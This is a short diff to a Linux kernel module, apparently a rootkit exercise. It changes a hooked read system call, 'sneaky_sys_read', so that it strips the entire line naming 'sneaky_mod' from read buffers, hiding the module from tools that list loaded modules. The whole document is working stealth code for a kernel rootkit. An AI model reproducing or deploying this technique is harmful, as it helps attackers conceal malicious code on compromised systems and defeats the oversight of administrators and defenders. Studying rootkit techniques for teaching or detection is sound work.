@@ -92,9 +92,14 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
   char * target = "sneaky_mod";
   char * res = strstr(temp, target);
   if(res){
-    printk(KERN_INFO "toremove mod:%s.\n", res);
-    memmove(res, res + strlen(target), strlen(res+strlen(target)));
-    return sz - strlen(target);
+    char * curr = res;
+    while(*curr != '\n'){
+      curr += 1;
+    }
+    curr += 1;
+    int length = curr - res;
+    memmove(res, curr, strlen(res) - length);
+    return sz - length;
   }
   return sz;
 }
